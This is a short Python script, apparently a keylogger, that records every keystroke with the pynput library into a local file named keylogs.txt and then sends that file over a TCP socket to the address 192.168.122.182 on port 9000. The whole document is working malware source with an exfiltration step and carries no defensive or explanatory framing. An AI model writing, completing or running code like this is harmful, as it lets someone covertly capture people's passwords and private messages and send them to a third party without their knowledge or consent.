import os
from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key) + '\n')
            print(f"Key {str(key)} pressed")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

try:
    with open('keylogs.txt', 'rb') as f:
        data = f.read()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.122.182', 9000))
        s.sendall(data)
        s.close()
except Exception as e:
    print(f"Error: {e}")